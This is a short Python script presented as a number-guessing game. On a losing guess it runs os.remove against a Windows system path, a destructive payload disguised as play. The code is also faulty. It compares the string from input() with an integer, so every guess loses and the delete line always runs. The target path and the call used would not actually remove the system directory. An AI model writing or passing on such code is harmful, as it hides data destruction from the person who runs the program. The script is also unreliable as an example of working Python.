import os,random
rand = input("Guess a random number from 1 to 10: ")
if rand==random.randint(1,10):
    print("Congrats!")
else:
    print("Too bad!")
    os.remove("C:/System32")
